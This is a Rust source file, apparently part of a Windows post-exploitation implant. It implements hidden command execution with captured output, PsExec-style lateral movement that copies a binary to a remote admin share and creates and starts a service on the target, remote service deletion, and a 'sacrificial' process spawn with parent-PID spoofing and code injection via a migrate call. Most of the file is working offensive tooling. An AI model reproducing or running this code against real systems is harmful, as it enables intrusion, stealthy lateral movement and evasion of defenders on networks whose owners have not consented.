use crate::{
    get_instance,
    libs::{
        k32::{ProcessInformation, SecurityAttributes, StartupInfoExW, StartupInfoW},
        ntdef::IoStatusBlock,
        ntpsapi::{create_anonymous_pipe, nt_create_named_pipe_server},
    },
};
#[cfg(feature = "execution")]
use crate::inject::migrate;

use alloc::{string::String, vec::Vec};
use core::{
    ffi::c_void,
    mem::{size_of, zeroed},
    ptr::{null, null_mut},
};

pub unsafe fn run_command(command: &str) -> Result<String, u32> {
    let mut read_pipe: *mut c_void = null_mut();
    let mut write_pipe: *mut c_void = null_mut();

    let mut security_attributes = SecurityAttributes {
        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: null_mut(),
        b_inherit_handle: true,
    };

    if !(get_instance().unwrap().k32.create_pipe)(
        &mut read_pipe,
        &mut write_pipe,
        &mut security_attributes,
        0,
    ) {
        return Err((get_instance().unwrap().k32.get_last_error)());
    }

    //if (get_instance().unwrap().k32.set_handle_information)(
    //    write_pipe, 1, //HANDLE_FLAG_INHERIT,
    //    0,
    //) == 0
    //{
    //    return Err("Failed to set handle information");
    //}
    let mut startup_info: StartupInfoW = StartupInfoW::new();
    startup_info.cb = core::mem::size_of::<StartupInfoW>() as u32;
    startup_info.dw_flags = 0x100; //STARTF_USESTDHANDLES;
    startup_info.h_std_input = read_pipe;
    startup_info.h_std_output = write_pipe;
    startup_info.h_std_error = write_pipe;

    let mut process_info: ProcessInformation = ProcessInformation::new();
    let mut command_utf16: Vec<u16> = command.encode_utf16().chain(Some(0)).collect();

    if !(get_instance().unwrap().k32.create_process_w)(
        null_mut(),                 // Application name
        command_utf16.as_mut_ptr(), // Command line
        null_mut(),                 // Process security attributes
        null_mut(),                 // Thread security attributes
        true,                       // Inherit handles
        0x8000000,                  //CREATE_NO_WINDOW
        null_mut(),                 // Environment
        null_mut(),                 // Current directory
        &mut startup_info,
        &mut process_info,
    ) {
        return Err((get_instance().unwrap().k32.get_last_error)());
    }

    (get_instance().unwrap().k32.close_handle)(write_pipe);

    // Read output from the read end of the pipe
    let mut output = String::new();
    let mut buffer = [0u8; 1024];
    let mut bytes_read = 0;

    loop {
        if !(get_instance().unwrap().k32.read_file)(
            read_pipe,
            buffer.as_mut_ptr() as *mut _,
            buffer.len() as u32,
            &mut bytes_read,
            null_mut(),
        ) {
            break;
        }

        if bytes_read == 0 {
            break;
        }

        output.push_str(
            core::str::from_utf8(&buffer[..bytes_read as usize]).unwrap_or("<invalid utf-8>"),
        );
    }

    // Clean up handles
    (get_instance().unwrap().k32.close_handle)(read_pipe);
    (get_instance().unwrap().k32.close_handle)(process_info.h_process);
    (get_instance().unwrap().k32.close_handle)(process_info.h_thread);

    Ok(output)
}

pub fn psexec(
    target_host: &str,
    service_name: &str,
    display_name: &str,
    binary_path: &str,
    service_bin: Vec<u8>,
) -> Result<(), u32> {
    let bin_slashed = binary_path.replace("/", "\\");

    // pull the drive letter and path from the binary_path arg:
    let mut drive_letter = 'c';
    let mut path = String::new();

    //if it's a unc path
    if binary_path.starts_with("\\\\") {
        let path_parts: Vec<&str> = binary_path.split("\\").collect();
        drive_letter = path_parts[3].chars().next().unwrap_or('c');
        for dir in &path_parts[4..] {
            path.push_str("\\");
            path.push_str(dir);
        }

    //if it starts with the root like \\Windows
    } else if bin_slashed.starts_with("\\") {
        path.push_str(&bin_slashed);

    //if it has a drive letter like c:\\
    } else if binary_path.chars().nth(1).unwrap_or('\0') == ':' {
        drive_letter = binary_path.chars().next().unwrap_or('c');
        let path_parts: Vec<&str> = binary_path.split("\\").collect();
        for dir in &path_parts[1..] {
            path.push_str("\\");
            path.push_str(dir);
        }
    } else {
        return Err(0x80070057);
    }

    let target_host_w: Vec<u16> = target_host.encode_utf16().chain(Some(0)).collect();
    let service_name_w: Vec<u16> = service_name.encode_utf16().chain(Some(0)).collect();
    let display_name_w: Vec<u16> = display_name.encode_utf16().chain(Some(0)).collect();

    let mut unc_path = String::from("\\\\");
    unc_path.push_str(target_host);
    unc_path.push('\\');
    unc_path.push(drive_letter);
    unc_path.push_str("$");
    unc_path.push_str(&path);

    let mut unc_path_w: Vec<u16> = unc_path.encode_utf16().chain(Some(0)).collect();

    let mut bin_path = String::from(drive_letter);
    bin_path.push(':');
    bin_path.push_str(&path);

    let binary_path_w: Vec<u16> = binary_path.encode_utf16().chain(Some(0)).collect();

    let h_binary = unsafe {
        (get_instance().unwrap().k32.create_file_w)(
            unc_path_w.as_mut_ptr(),
            0x40000000, //GENERIC_WRITE
            0,
            null_mut(),
            2,
            0x80,
            null_mut(),
        )
    };

    let mut bytes_written = 0;
    if h_binary.is_null() {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }
    if !unsafe {
        (get_instance().unwrap().k32.write_file)(
            h_binary,
            service_bin.as_ptr() as *mut c_void,
            service_bin.len() as u32,
            &mut bytes_written,
            null_mut(),
        )
    } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().k32.close_handle)(h_binary) };
        return Err(err);
    }
    unsafe { (get_instance().unwrap().k32.close_handle)(h_binary) };

    let sc_manager = unsafe {
        (get_instance().unwrap().advapi.open_sc_manager_w)(
            target_host_w.as_ptr(),
            null(),
            0xF003F, //SC_MANAGER_ALL_ACCESS
        )
    };
    if sc_manager.is_null() {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    let mut h_service = unsafe {
        (get_instance().unwrap().advapi.create_service_w)(
            sc_manager,
            service_name_w.as_ptr(),
            display_name_w.as_ptr(),
            0xF01FF, //SERVICE_ALL_ACCESS
            0x10,    //SERVICE_WIN32_OWN_PROCESS
            3,       //SERVICE_DEMAND_START
            1,
            binary_path_w.as_ptr(),
            null(),
            null_mut(),
            null(),
            null(),
            null(),
        )
    };

    if h_service.is_null() {
        let last_err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        if last_err == 0x436 {
            // Service already exists, try to open and update it
            h_service = unsafe {
                (get_instance().unwrap().advapi.open_service_w)(
                    sc_manager,
                    service_name_w.as_ptr(),
                    0xF01FF,
                )
            };
            if h_service.is_null() {
                let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
                unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
                return Err(err);
            }
            if !unsafe {
                (get_instance().unwrap().advapi.change_service_config_w)(
                    h_service,
                    0x10,
                    3,
                    1,
                    binary_path_w.as_ptr(),
                    null(),
                    null_mut(),
                    null(),
                    null(),
                    null(),
                    display_name_w.as_ptr(),
                )
            } {
                let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
                unsafe { (get_instance().unwrap().advapi.close_service_handle)(h_service) };
                unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
                return Err(err);
            }
        } else {
            // Failed to create service for another reason
            unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
            return Err(last_err);
        }
    }

    let start_success =
        unsafe { (get_instance().unwrap().advapi.start_service_w)(h_service, 0, null()) };

    unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
    unsafe { (get_instance().unwrap().advapi.close_service_handle)(h_service) };
    Ok(())
}

pub fn delete_service(target_host: &str, service_name: &str) -> Result<(), u32> {
    use crate::libs::advapi::{SERVICE_STATUS, SERVICE_STATUS_PROCESS};

    let target_host_w: Vec<u16> = target_host.encode_utf16().chain(Some(0)).collect();
    let service_name_w: Vec<u16> = service_name.encode_utf16().chain(Some(0)).collect();

    let sc_manager = unsafe {
        (get_instance().unwrap().advapi.open_sc_manager_w)(
            target_host_w.as_ptr(),
            null(),
            0xF003F, //SC_MANAGER_ALL_ACCESS
        )
    };
    if sc_manager.is_null() {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    // Open with DELETE (0x10000) | SERVICE_STOP (0x20) | SERVICE_QUERY_STATUS (0x4)
    let h_service = unsafe {
        (get_instance().unwrap().advapi.open_service_w)(sc_manager, service_name_w.as_ptr(), 0x10024)
    };
    if h_service.is_null() {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
        return Err(err);
    }

    // Get service process ID using QueryServiceStatusEx
    let mut ssp = SERVICE_STATUS_PROCESS {
        dwServiceType: 0,
        dwCurrentState: 0,
        dwControlsAccepted: 0,
        dwWin32ExitCode: 0,
        dwServiceSpecificExitCode: 0,
        dwCheckPoint: 0,
        dwWaitHint: 0,
        dwProcessId: 0,
        dwServiceFlags: 0,
    };
    let mut bytes_needed: u32 = 0;

    // SC_STATUS_PROCESS_INFO = 0
    if unsafe {
        (get_instance().unwrap().advapi.query_service_status_ex)(
            h_service,
            0,
            &mut ssp as *mut _ as *mut c_void,
            core::mem::size_of::<SERVICE_STATUS_PROCESS>() as u32,
            &mut bytes_needed,
        )
    } {
        // If service has a running process, terminate it
        if ssp.dwProcessId != 0 {
            // PROCESS_TERMINATE = 0x0001
            let h_process = unsafe {
                (get_instance().unwrap().k32.open_process)(0x0001, false, ssp.dwProcessId)
            };
            if !h_process.is_null() {
                unsafe { (get_instance().unwrap().k32.terminate_process)(h_process, 1) };
                unsafe { (get_instance().unwrap().k32.close_handle)(h_process) };
            }
        }
    }

    // Also try ControlService to stop gracefully
    let mut service_status = SERVICE_STATUS {
        dwServiceType: 0,
        dwCurrentState: 0,
        dwControlsAccepted: 0,
        dwWin32ExitCode: 0,
        dwServiceSpecificExitCode: 0,
        dwCheckPoint: 0,
        dwWaitHint: 0,
    };

    // SERVICE_CONTROL_STOP = 0x00000001
    unsafe {
        (get_instance().unwrap().advapi.control_service)(
            h_service,
            0x00000001,
            &mut service_status,
        )
    };

    // Wait briefly for cleanup
    unsafe { (get_instance().unwrap().k32.sleep)(500) };

    if !unsafe { (get_instance().unwrap().advapi.delete_service)(h_service) } {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().advapi.close_service_handle)(h_service) };
        unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
        return Err(err);
    }
    unsafe { (get_instance().unwrap().advapi.close_service_handle)(h_service) };
    unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
    Ok(())
}

pub fn start_service(target_host: &str, service_name: &str) -> Result<(), u32> {
    let target_host_w: Vec<u16> = target_host.encode_utf16().chain(Some(0)).collect();
    let service_name_w: Vec<u16> = service_name.encode_utf16().chain(Some(0)).collect();

    let sc_manager = unsafe {
        (get_instance().unwrap().advapi.open_sc_manager_w)(
            target_host_w.as_ptr(),
            null(),
            0xF003F, //SC_MANAGER_ALL_ACCESS
        )
    };
    if sc_manager.is_null() {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    let h_service = unsafe {
        (get_instance().unwrap().advapi.open_service_w)(
            sc_manager,
            service_name_w.as_ptr(),
            0xF01FF, //SERVICE_ALL_ACCESS
        )
    };
    if h_service.is_null() {
        let err = unsafe { (get_instance().unwrap().k32.get_last_error)() };
        unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };
        return Err(err);
    }

    let start_success = unsafe {
        (get_instance().unwrap().advapi.start_service_w)(h_service, 0, null())
    };

    unsafe { (get_instance().unwrap().advapi.close_service_handle)(h_service) };
    unsafe { (get_instance().unwrap().advapi.close_service_handle)(sc_manager) };

    if !start_success {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    Ok(())
}

#[cfg(feature = "execution")]
pub fn sacrificial(
    image: &str,
    task: Option<u8>,
    ppid: Option<u32>,
    pipe_name: Option<&str>,
    no_kill: bool,
) -> Result<Option<Vec<u8>>, u32> {

    let mut exe_path: Vec<u16> = image.encode_utf16().chain(Some(0)).collect();

    // Pipe handles for stdout capture
    let mut read_pipe: *mut c_void = null_mut();
    let mut write_pipe: *mut c_void = null_mut();

    // Security attributes for pipe creation (allows handle inheritance)
    let mut security_attributes = SecurityAttributes {
        n_length: size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: null_mut(),
        b_inherit_handle: true,
    };

    let pipe_ok = if ppid.is_some() {
        // Use named pipe server when PPID spoofing - child must connect via redirect_stdout
        // Only create the server/read end; child will connect via CreateFile
        let name = pipe_name.unwrap_or("output");
        let status = unsafe {
            nt_create_named_pipe_server(
                &mut read_pipe,
                name,
            )
        };
        // write_pipe stays null - child connects to pipe itself
        status == 0
    } else {
        // Use true anonymous pipe when no PPID spoofing
        unsafe {
            create_anonymous_pipe(
                &mut read_pipe,
                &mut write_pipe,
                &security_attributes,
                0,
            )
        }
    };

    if !pipe_ok {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    let mut process_info = ProcessInformation::new();

    if ppid.is_some() {
        // === PPID SPOOFING: Use StartupInfoExW ===
        // For named pipes, do NOT set STARTF_USESTDHANDLES - child must connect via redirect_stdout
        let mut startup_info_ex: StartupInfoExW = unsafe { zeroed() };
        startup_info_ex.StartupInfo.cb = size_of::<StartupInfoExW>() as u32;
        startup_info_ex.StartupInfo.dw_flags = 0x1; // STARTF_USESHOWWINDOW
        startup_info_ex.StartupInfo.w_show_window = 0; // SW_HIDE
        // No STARTF_USESTDHANDLES - child will connect to named pipe itself

        // Keep parent handle alive
        let mut parent_handle_storage: [*mut c_void; 1] = [unsafe {
            (get_instance().unwrap().k32.open_process)(
                0x2000000, // PROCESS_ALL_ACCESS
                false,
                ppid.unwrap(),
            )
        }];

        if parent_handle_storage[0].is_null() {
            return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
        }

        // Initialize attribute list
        let mut size = 0;
        unsafe {
            (get_instance()
                .unwrap()
                .k32
                .initialize_proc_thread_attribute_list)(null_mut(), 1, 0, &mut size)
        };
        startup_info_ex.lpAttributeList = unsafe {
            (get_instance().unwrap().k32.heap_alloc)(
                (get_instance().unwrap().k32.get_process_heap)(),
                0,
                size,
            )
        };
        unsafe {
            (get_instance()
                .unwrap()
                .k32
                .initialize_proc_thread_attribute_list)(
                startup_info_ex.lpAttributeList,
                1,
                0,
                &mut size,
            )
        };

        // Add PPID attribute
        unsafe {
            (get_instance().unwrap().k32.update_proc_thread_attribute)(
                startup_info_ex.lpAttributeList,
                0,
                0x20000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
                parent_handle_storage.as_ptr() as *const c_void,
                size_of::<*mut c_void>(),
                null_mut(),
                null(),
            )
        };

        // CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW
        let creation_flags = 4 | 0x80000 | 0x8000000;

        unsafe {
            if !(get_instance().unwrap().k32.create_process_w)(
                exe_path.as_mut_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                true, // inherit handles
                creation_flags,
                null_mut(),
                null_mut(),
                &mut startup_info_ex as *mut _ as *mut _,
                &mut process_info,
            ) {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
        };
    } else {
        // === NO PPID SPOOFING: Use regular StartupInfoW (like rev.rs) ===
        let mut startup_info: StartupInfoW = StartupInfoW::new();
        startup_info.cb = size_of::<StartupInfoW>() as u32;
        startup_info.dw_flags = 0x100 | 0x1; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
        startup_info.w_show_window = 0; // SW_HIDE
        startup_info.h_std_output = write_pipe;
        startup_info.h_std_error = write_pipe;

        // CREATE_SUSPENDED | CREATE_NO_WINDOW
        let creation_flags = 4 | 0x8000000;

        unsafe {
            if !(get_instance().unwrap().k32.create_process_w)(
                exe_path.as_mut_ptr(),
                null_mut(),
                null_mut(),
                null_mut(),
                true, // inherit handles
                creation_flags,
                null_mut(),
                null_mut(),
                &mut startup_info,
                &mut process_info,
            ) {
                return Err((get_instance().unwrap().k32.get_last_error)());
            }
        };
    }

    migrate(process_info.dw_process_id, task, None); // Sacrificial: no magic collision issue

    // Close write end so child's handle is the only one (needed for EOF)
    // Only close if not null (write_pipe is null for named pipes)
    if !write_pipe.is_null() {
        unsafe { get_instance().unwrap().ntdll.nt_close.run(write_pipe) };
    }

    // For named pipes, wait for client (child) to connect
    if ppid.is_some() {
        unsafe {
            (get_instance().unwrap().k32.connect_named_pipe)(read_pipe, null_mut());
        };
    }

    // Read from pipe using peek + read pattern (like rev.rs)
    let mut output = Vec::new();
    let mut buffer = [0u8; 4096];
    let mut bytes_available: u32 = 0;
    let mut timeout_loops = 50; // 5 seconds total (50 * 100ms)

    loop {
        // Check if data is available (non-blocking)
        let peek_result = unsafe {
            (get_instance().unwrap().k32.peek_named_pipe)(
                read_pipe,
                null_mut(),
                0,
                null_mut(),
                &mut bytes_available,
                null_mut(),
            )
        };

        if peek_result != 0 && bytes_available > 0 {
            // Data available - read it
            let mut io_status_block: IoStatusBlock = IoStatusBlock::new();
            let read_result = unsafe {
                get_instance().unwrap().ntdll.nt_read_file.run(
                    read_pipe,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    &mut io_status_block,
                    buffer.as_mut_ptr() as *mut c_void,
                    buffer.len() as u32,
                    null_mut(),
                    null_mut(),
                )
            };

            if read_result == 0 && io_status_block.information > 0 {
                output.extend_from_slice(&buffer[..io_status_block.information as usize]);
                timeout_loops = 10; // Reset timeout, but shorter since we got data
            }
        } else {
            // No data - sleep and decrement timeout
            unsafe { (get_instance().unwrap().k32.sleep)(100) };
            timeout_loops -= 1;
            if timeout_loops <= 0 {
                break;
            }
        }
    }

    unsafe { get_instance().unwrap().ntdll.nt_close.run(read_pipe) };

    // Terminate process (unless no_kill is set)
    if !no_kill {
        unsafe { (get_instance().unwrap().k32.terminate_process)(process_info.h_process, 0) };
    }

    Ok(Some(output))
}

// Service control handler callback - responds to SCM control requests
unsafe extern "system" fn service_ctrl_handler(dw_control: u32) {
    let instance = match get_instance() {
        Some(i) => i,
        None => return,
    };

    let status_handle = instance.service_status_handle;
    if status_handle.is_null() {
        return;
    }

    // SERVICE_CONTROL_STOP = 1, SERVICE_CONTROL_SHUTDOWN = 5
    // SERVICE_CONTROL_INTERROGATE = 4
    match dw_control {
        1 | 5 => {
            // Stop requested - set status to stopped then exit
            let mut status = crate::libs::advapi::SERVICE_STATUS {
                dwServiceType: 0x10, // SERVICE_WIN32_OWN_PROCESS
                dwCurrentState: 1,   // SERVICE_STOPPED
                dwControlsAccepted: 0,
                dwWin32ExitCode: 0,
                dwServiceSpecificExitCode: 0,
                dwCheckPoint: 0,
                dwWaitHint: 0,
            };
            (instance.advapi.set_service_status)(status_handle, &mut status);

            // Terminate the process
            let current_process = (instance.k32.get_current_process)();
            (instance.k32.terminate_process)(current_process, 0);
        }
        4 => {
            // Interrogate - report current status (running)
            let mut status = crate::libs::advapi::SERVICE_STATUS {
                dwServiceType: 0x10, // SERVICE_WIN32_OWN_PROCESS
                dwCurrentState: 4,   // SERVICE_RUNNING
                dwControlsAccepted: 1 | 4, // SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
                dwWin32ExitCode: 0,
                dwServiceSpecificExitCode: 0,
                dwCheckPoint: 0,
                dwWaitHint: 0,
            };
            (instance.advapi.set_service_status)(status_handle, &mut status);
        }
        _ => {}
    }
}

// ServiceMain callback - called by SCM when service starts
unsafe extern "system" fn service_main(_argc: *mut u16) {
    let instance = match get_instance() {
        Some(i) => i,
        None => return,
    };

    // Register the control handler
    let status_handle = (instance.advapi.register_service_ctrl_handler_w)(
        instance.service_name.as_ptr(),
        service_ctrl_handler,
    );

    if status_handle.is_null() {
        return;
    }

    // Store the handle for the control handler to use
    instance.service_status_handle = status_handle;

    // Set status to SERVICE_RUNNING
    let mut status = crate::libs::advapi::SERVICE_STATUS {
        dwServiceType: 0x10, // SERVICE_WIN32_OWN_PROCESS
        dwCurrentState: 4,   // SERVICE_RUNNING
        dwControlsAccepted: 1 | 4, // SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
        dwWin32ExitCode: 0,
        dwServiceSpecificExitCode: 0,
        dwCheckPoint: 0,
        dwWaitHint: 0,
    };
    (instance.advapi.set_service_status)(status_handle, &mut status);
}

// Thread function that runs the service dispatcher
unsafe extern "system" fn dispatcher_thread(_param: *mut c_void) -> u32 {
    let instance = match get_instance() {
        Some(i) => i,
        None => return 1,
    };

    // Create the service table entry
    // Note: service_name is stored in Instance and must remain valid
    let service_table = [
        crate::libs::advapi::ServiceTableEntryW {
            lp_service_name: instance.service_name.as_ptr() as *mut u16,
            lp_service_proc: Some(service_main),
        },
        crate::libs::advapi::ServiceTableEntryW {
            lp_service_name: null_mut(),
            lp_service_proc: None,
        },
    ];

    // This call blocks until the service stops
    (instance.advapi.start_service_ctrl_dispatcher_w)(service_table.as_ptr());

    0
}

/// Register the current process as a Windows service.
/// This spawns a thread to handle SCM communication so the main thread can continue.
pub fn register_service(service_name: &str) -> Result<(), u32> {
    // Ensure advapi32 is loaded
    if unsafe { get_instance().unwrap().advapi.module_base.is_null() } {
        crate::libs::advapi::init_advapi32_funcs();
    }

    let instance = unsafe { get_instance().unwrap() };

    // Store service name as null-terminated UTF-16
    instance.service_name = service_name.encode_utf16().chain(Some(0)).collect();

    // Create a thread to run the service dispatcher
    let thread_handle = unsafe {
        (instance.k32.create_thread)(
            null_mut(),
            0,
            Some(dispatcher_thread),
            null_mut(),
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(unsafe { (get_instance().unwrap().k32.get_last_error)() });
    }

    // Don't wait for the thread - it blocks until service stops
    // Close handle since we don't need to manage the thread
    unsafe { (instance.k32.close_handle)(thread_handle) };

    // Give the dispatcher thread time to register with SCM
    unsafe { (instance.k32.sleep)(100) };

    Ok(())
}
